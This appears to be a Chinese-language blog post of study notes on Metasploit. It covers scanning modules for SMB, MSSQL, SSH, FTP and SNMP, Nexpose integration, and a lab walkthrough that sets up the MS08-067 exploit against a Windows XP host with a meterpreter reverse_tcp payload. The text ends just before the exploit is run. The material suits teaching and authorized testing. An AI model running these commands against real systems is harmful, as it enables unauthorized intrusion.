<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq</span><br><span class="line"></span><br><span class="line">msf &gt; set RHOSTS 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<blockquote>
<p>RHOSTS ： IP地址段（192.168.1.100-192.168.1.200）、CIDR（无类型毓间选路）地址快（192.168.1.0/24）、使用逗号分隔的多个CIDR地址快，以及每行包含一个 IP 地址的文本<br>THREADS ： 设定扫描线程数。Windows 不要超过16， Unix 不要超过 128</p>
</blockquote>
<p>获得空闲 IP 后，可在 nmap 中使用 -sI 参数指定空闲主机</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -PN -sI 192.168.1.100 192.168.1.200</span></span><br></pre></td></tr></table></figure>

<h4 id="3-在-MSF-终端运行-nmap"><a href="#3-在-MSF-终端运行-nmap" class="headerlink" title="3. 在 MSF 终端运行 nmap"></a>3. 在 MSF 终端运行 nmap</h4><p>Metasploit 中 集成的 nmap 使用的是 db_nmap 命令</p>
<p>默认会将扫描结果存储的 MSF 的数据库中</p>
<h3 id="3-2-3-使用-Metasploit-进行端口扫描"><a href="#3-2-3-使用-Metasploit-进行端口扫描" class="headerlink" title="3.2.3 使用 Metasploit 进行端口扫描"></a>3.2.3 使用 Metasploit 进行端口扫描</h3><blockquote>
<p>跳板攻击：利用网络内部已经被攻陷的主机，将攻击数据路由到原本无法到达的目的地。</p>
</blockquote>
<p>查看 Metasploit 框架提供的端口扫描工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search postscan</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                              Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner</span><br><span class="line">   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner</span><br><span class="line">   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner</span><br><span class="line">   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP &quot;XMas&quot; Port Scanner</span><br><span class="line">   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner</span><br><span class="line">   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner</span><br><span class="line">   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner</span><br><span class="line">   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator</span><br></pre></td></tr></table></figure>
<p>然后 use 相应的扫描模块进行扫描</p>
<h2 id="3-3-针对性扫描"><a href="#3-3-针对性扫描" class="headerlink" title="3.3 针对性扫描"></a>3.3 针对性扫描</h2><p>针对性扫描是指寻找目标网络中存在的已知可利用漏洞或能够轻松获取后门的特定操作系统、服务、软件以及配置缺陷。</p>
<p>扫描整个网络中所有漏洞后再攻击是难的，针对性扫描相对来说更常见。</p>
<h3 id="3-3-1-SMB（服务器消息块）-协议扫描"><a href="#3-3-1-SMB（服务器消息块）-协议扫描" class="headerlink" title="3.3.1 SMB（服务器消息块） 协议扫描"></a>3.3.1 SMB（服务器消息块） 协议扫描</h3><p>利用 Metasploit 的 smb_version 模块来遍历一个网络，并获取系统的版本号。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version </span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 10.0.0.28</span><br><span class="line">rhosts =&gt; 10.0.0.28</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.0.0.28:445         - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)</span><br><span class="line">[+] 10.0.0.28:445         -   Host is running Windows XP SP3 (language:English) (name:SEU-A601A799D94) (workgroup:MSHOME)</span><br><span class="line">[*] 10.0.0.28:            - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/</span><br><span class="line">use auxiliary/scanner/smb/impacket/dcomexec      use auxiliary/scanner/smb/psexec_loggedin_users  use auxiliary/scanner/smb/smb_login</span><br><span class="line">use auxiliary/scanner/smb/impacket/secretsdump   use auxiliary/scanner/smb/smb_enum_gpp           use auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line">use auxiliary/scanner/smb/impacket/wmiexec       use auxiliary/scanner/smb/smb_enumshares         use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor           use auxiliary/scanner/smb/smb_enumusers          use auxiliary/scanner/smb/smb_uninit_cred</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor    use auxiliary/scanner/smb/smb_enumusers_domain   use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>


<h3 id="3-3-2-搜寻配置不当的-Microsoft-SQL-Server"><a href="#3-3-2-搜寻配置不当的-Microsoft-SQL-Server" class="headerlink" title="3.3.2 搜寻配置不当的 Microsoft SQL Server"></a>3.3.2 搜寻配置不当的 Microsoft SQL Server</h3><p>实际上很多人不知道他们工作站上装有 MS SQL 服务器软件，因为它经常作为其他常用软件（如 Microsoft Visual Studio）安装的先决条件被自动地安装在系统上。</p>
<p>配置不当的 Microsoft SQL Server 通常是进入目标系统的第一个后门。</p>
<p>MS SQL 安装后，它默认监听在 TCP 端口 1433 上或使用随机的动态 TCP 端口。随机 TCP 端口只需要简单地对 UDP 1434 端口进行查询，便能获得随机的 TCP 端口。</p>
<p>Metasploit 有一个 mssql_ping 可以直接用。 mssql_ping 使用 UDP 协议。Metasploit 发现 MS SQL 服务器时，它会将所有能获取的服务器信息都显示出来，其中最为重要的是服务器监听的 TCP 端口。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search mssql_ping</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/mssql/mssql_ping                   normal  No     MSSQL Ping Utility</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; show options</span><br></pre></td></tr></table></figure>
<p>扫描器不仅能定位 MSSQL 服务器地址，还能确定 MSSQL 实例名、服务器版本以及服务器监听的 TCP 端口。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/mssql/mssql_</span><br><span class="line">use auxiliary/scanner/mssql/mssql_hashdump    use auxiliary/scanner/mssql/mssql_ping        </span><br><span class="line">use auxiliary/scanner/mssql/mssql_login       use auxiliary/scanner/mssql/mssql_schemadump  </span><br></pre></td></tr></table></figure>

<h3 id="3-3-3-SSH-服务器扫描"><a href="#3-3-3-SSH-服务器扫描" class="headerlink" title="3.3.3 SSH 服务器扫描"></a>3.3.3 SSH 服务器扫描</h3><p>SSH 安全仅指数据传输的加密，很多 SSH 的实现版本中均发现了安全漏洞。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/</span><br><span class="line">use auxiliary/scanner/ssh/apache_karaf_command_execution  use auxiliary/scanner/ssh/libssh_auth_bypass</span><br><span class="line">use auxiliary/scanner/ssh/cerberus_sftp_enumusers         use auxiliary/scanner/ssh/ssh_enum_git_keys</span><br><span class="line">use auxiliary/scanner/ssh/detect_kippo                    use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">use auxiliary/scanner/ssh/eaton_xpert_backdoor            use auxiliary/scanner/ssh/ssh_identify_pubkeys</span><br><span class="line">use auxiliary/scanner/ssh/fortinet_backdoor               use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">use auxiliary/scanner/ssh/juniper_backdoor                use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">use auxiliary/scanner/ssh/karaf_login                     use auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure>

<h3 id="3-3-4-FTP-扫描"><a href="#3-3-4-FTP-扫描" class="headerlink" title="3.3.4 FTP 扫描"></a>3.3.4 FTP 扫描</h3><p>FTP 是一种复杂且缺乏安全性的应用层协议。</p>
<p>在渗透测试工作中，总是应当对目标系统上运行的 FTP 服务器进行扫描、识别和查点。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ftp/</span><br><span class="line">use auxiliary/scanner/ftp/anonymous                use auxiliary/scanner/ftp/easy_file_sharing_ftp    use auxiliary/scanner/ftp/konica_ftp_traversal</span><br><span class="line">use auxiliary/scanner/ftp/bison_ftp_traversal      use auxiliary/scanner/ftp/ftp_login                use auxiliary/scanner/ftp/pcman_ftp_traversal</span><br><span class="line">use auxiliary/scanner/ftp/colorado_ftp_traversal   use auxiliary/scanner/ftp/ftp_version              use auxiliary/scanner/ftp/titanftp_xcrc_traversal</span><br></pre></td></tr></table></figure>
<p>可以先用<code>auxiliary/scanner/ftp/ftp_version</code>模块扫描是否存在FTP服务器，再使用<code>auxiliary/scanner/ftp/anonymous</code>模块检查是否允许匿名用户登录。</p>
<h3 id="3-3-5-简单网管协议（SNMP）扫描"><a href="#3-3-5-简单网管协议（SNMP）扫描" class="headerlink" title="3.3.5 简单网管协议（SNMP）扫描"></a>3.3.5 简单网管协议（SNMP）扫描</h3><p>可访问的 SNMP 服务器能够泄露关于某特定系统相当多的信息，甚至会导致设备被远程攻陷。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/snmp/</span><br><span class="line">use auxiliary/scanner/snmp/aix_version                 use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/arris_dg950                 use auxiliary/scanner/snmp/snmp_enum_hp_laserjet</span><br><span class="line">use auxiliary/scanner/snmp/brocade_enumhash            use auxiliary/scanner/snmp/snmp_enumshares</span><br><span class="line">use auxiliary/scanner/snmp/cisco_config_tftp           use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">use auxiliary/scanner/snmp/cisco_upload_file           use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/cnpilot_r_snmp_loot         use auxiliary/scanner/snmp/snmp_set</span><br><span class="line">use auxiliary/scanner/snmp/epmp1000_snmp_loot          use auxiliary/scanner/snmp/ubee_ddw3611</span><br><span class="line">use auxiliary/scanner/snmp/netopia_enum                use auxiliary/scanner/snmp/xerox_workcentre_enumusers</span><br><span class="line">use auxiliary/scanner/snmp/sbg6580_enum </span><br></pre></td></tr></table></figure>
<p>可以使用为 SNMP 专门设计的 <code>scanner/snmp/snmp_enum</code>模块。</p>
<p>如果能够获取只读（RO）或读/写（RW）权限的团体字符串，将对从设备中提取信息发挥重要作用。</p>
<p>猜解出团体字符串后，SNMP(并非所有版本)可以允许做其管理范围内的任何事情。</p>
<h2 id="3-4-编写自己的扫描器"><a href="#3-4-编写自己的扫描器" class="headerlink" title="3.4 编写自己的扫描器"></a>3.4 编写自己的扫描器</h2><p>Metasploit 框架拥有很多建立自定义扫描器所需的实用功能。</p>
<h1 id="4-漏洞扫描"><a href="#4-漏洞扫描" class="headerlink" title="4. 漏洞扫描"></a>4. 漏洞扫描</h1><p>漏洞扫描器通过网络对目标系统进行探测，向目标系统发送数据，并将反馈数据与自带的漏洞特征库进行匹配，进而列举出目标系统上存在的安全漏洞。</p>
<p>各种操作系统网络模块实现原理不同，因此对接收到的探测数据往往会有不同响应。通过响应可以确定操作系统版本，甚至确定补丁安装等级。</p>
<p>漏洞扫描器可以使用登录凭证登录到远程系统上。</p>
<p>漏洞扫描器能够根据扫描结果生成报告，对系统上经检测发现的安全漏洞进行描述。</p>
<p>漏洞扫描器会产生大量流量，因此通常不能隐秘进行。</p>
<p>漏洞扫描器通常结果包含许多误报，开发者通常宁可误报也不漏报。</p>
<p>扫描质量很大程度上取决于漏洞特征库。</p>
<h2 id="4-1-基本的漏洞扫描"><a href="#4-1-基本的漏洞扫描" class="headerlink" title="4.1 基本的漏洞扫描"></a>4.1 基本的漏洞扫描</h2><p>许多网络服务，比如 web、文件传输以及邮件等，一旦连接到服务有端口或发送特定指令，就可以获取旗标。<br>书中示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> root@kali:~<span class="comment"># nc 192.168.1.201 80</span></span></span><br><span class="line">GET HTTP/1.1</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: Microsoft-IIS/5.1</span><br></pre></td></tr></table></figure>
<p>返回信息表明端口80上运行的是 Microsoft-IIS/5.1 Web 服务器，可以查看漏洞扫描器上是否有对应漏洞。</p>
<h2 id="4-2-Nexpose"><a href="#4-2-Nexpose" class="headerlink" title="4.2 Nexpose"></a>4.2 Nexpose</h2><p>Nexpose 是专门的漏洞扫描器产品。</p>
<p>Nexpose 有免费社区版和收费商业版。</p>
<h3 id="4-2-1-在-MSF-控制台中运行-Nexpose"><a href="#4-2-1-在-MSF-控制台中运行-Nexpose" class="headerlink" title="4.2.1 在 MSF 控制台中运行 Nexpose"></a>4.2.1 在 MSF 控制台中运行 Nexpose</h3><blockquote>
<p>也可以单独安装 Nexpose，然后将结果导入到 Metasploit 中</p>
</blockquote>
<p>使用 <code>load Nexpose</code> 命令在 msfconsole 中载入 Nexpose 插件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load nexpose</span><br><span class="line">msf6 &gt; help</span><br><span class="line"></span><br><span class="line">Nexpose Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    nexpose_activity          Display any active scan jobs on the Nexpose instance</span><br><span class="line">    nexpose_command           Execute a console command on the Nexpose instance</span><br><span class="line">    nexpose_connect           Connect to a running Nexpose instance ( user:pass@host[:port] )</span><br><span class="line">    nexpose_disconnect        Disconnect from an active Nexpose instance</span><br><span class="line">    nexpose_discover          Launch a scan but only perform host and minimal service discovery</span><br><span class="line">    nexpose_dos               Launch a scan that includes checks that can crash services and devices (caution)</span><br><span class="line">    nexpose_exhaustive        Launch a scan covering all TCP ports and all authorized safe checks</span><br><span class="line">    nexpose_report_templates  List all available report templates</span><br><span class="line">    nexpose_save              Save credentials to a Nexpose instance</span><br><span class="line">    nexpose_scan              Launch a Nexpose scan against a specific IP range and import the results</span><br><span class="line">    nexpose_site_devices      List all discovered devices within a site</span><br><span class="line">    nexpose_site_import       Import data from the specified site ID</span><br><span class="line">    nexpose_sites             List all defined sites</span><br><span class="line">    nexpose_sysinfo           Display detailed system information about the Nexpose instance</span><br></pre></td></tr></table></figure>
<p>连接到所安装的 Nexpose 实例</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; nexpose_connect -h</span><br><span class="line">[*] Usage: </span><br><span class="line">[*]        nexpose_connect username:password@host[:port] &lt;ssl-confirm || trusted_cert_file&gt;</span><br><span class="line">[*]         -OR- </span><br><span class="line">[*]        nexpose_connect username password host port &lt;ssl-confirm || trusted_cert_file&gt;</span><br></pre></td></tr></table></figure>




<h1 id="5-渗透攻击之旅"><a href="#5-渗透攻击之旅" class="headerlink" title="5. 渗透攻击之旅"></a>5. 渗透攻击之旅</h1><h2 id="5-1-渗透攻击基础"><a href="#5-1-渗透攻击基础" class="headerlink" title="5.1 渗透攻击基础"></a>5.1 渗透攻击基础</h2><ul>
<li>show exploits：显示 Metasploit 框架中所有可用的渗透攻击模块。</li>
<li>show auxiliary：显示所有的辅助模块以及它们的用途（如扫描器、拒绝服务攻击工具、Fuzz测试器等等）。</li>
<li>show options：列出当前模块所需的各个参数，如果没有选择任何模块，则显示全局参数。<ul>
<li>back：返回 Metasplot 上一个状态</li>
<li>set/uset：当前模块参数</li>
<li>setg/unsetg：全局参数</li>
</ul>
</li>
<li>show payloads：显示与当前模块兼容的攻击载荷。一般会根据环境识别出可在一次特定的渗透攻击中使用的攻击载荷。</li>
<li>show targets：列出受到漏洞影响目标系统的类型。<ul>
<li>自动选择目标（Auto Targeting）通常会根据目标系统的指纹信息自动选择操作系统版本进行攻击。</li>
<li>最好通过人工更加准确地识别出目标操作系统的相关信息，避免出发错误的、破坏性的攻击。</li>
</ul>
</li>
<li>info：更加详细的显示模块信息。（info + 模块名，已选择某个模块可直接输入 into）</li>
<li>save：保存状态。既可以保存全局状态也可以保存某个模块状态。</li>
</ul>
<h2 id="5-2-第一次渗透攻击"><a href="#5-2-第一次渗透攻击" class="headerlink" title="5.2 第一次渗透攻击"></a>5.2 第一次渗透攻击</h2><blockquote>
<p>靶机：Windows xp Home Edition Service Pack 3<br>利用安全漏洞：MS08-067</p>
</blockquote>
<p>先不依赖漏洞扫描器使用手工方法来发现漏洞</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; nmap -sT -A --script=smb-vuln-ms08-067 -P0 10.0.0.28</span><br><span class="line">[*] exec: nmap -sT -A --script=smb-vuln-ms08-067 -P0 10.0.0.28</span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 02:37 EDT</span><br><span class="line">Nmap scan report for 10.0.0.28</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">2869/tcp open  http         Microsoft HTTPAPI httpd 1.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/1.0</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.70 seconds</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>-sT：隐秘的 TCP 连接扫描（Stealth TCP connect）</li>
<li>-sS：隐秘的 TCP Syn 扫描</li>
<li>-A：高级操作系统探测功能（advanced OS detection），对一个特定服务进行深入的旗标和指纹获取</li>
</ul>
</blockquote>
<p>攻击是否成功取决于目标主机的操作系统版本、安装的服务包（service pack）版本以及语言类型，同时还依赖于是否成功绕过了数据执行保护（DEP：Data Execution Prevention）。</p>
<p>DEP 是为了防御缓冲区溢出攻击而设计的，它将程序堆栈渲染为只读，以防止 shellcode 被恶意放置在堆栈区并执行。</p>
<p>下面开始实际的攻击过程：</p>
<ol>
<li><p>在 Metasploit 框架中查找 MS08-067 攻击模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms08_067</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure></li>
<li><p>使用 use 命令加载攻击模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p>这攻击模块默认的攻击载荷为基于 Windows 系统的 Meterpreter reverse_tcp，这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到 LHOST 中指定的 IP 地址。这种反弹连接可以绕过防火墙的入站流量保护或者穿透 NAT 网关。</p>
</li>
</ol>
<ol start="3">
<li><p>设置目标操作系统类型</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">   1   Windows 2000 Universal</span><br><span class="line">   2   Windows XP SP0/SP1 Universal</span><br><span class="line">   3   Windows 2003 SP0 Universal</span><br><span class="line">   4   Windows XP SP2 English (AlwaysOn NX)</span><br><span class="line">   5   Windows XP SP2 English (NX)</span><br><span class="line">   6   Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set TARGET 6</span><br><span class="line">TARGET =&gt; 6</span><br></pre></td></tr></table></figure>
<blockquote>
<p>AlwaysOn NX：NX(No Execute)，意思是不允许执行，即启动了 DEP 保护。Windows XP SP3 中 DEP 是默认启用的。</p>
</blockquote>
</li>
<li><p>设置参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.0.0.29        yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   6   Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.0.0.28</span><br><span class="line">RHOST =&gt; 10.0.0.28</span><br></pre></td></tr></table></figure></li>
<li><p>执行攻击</p>
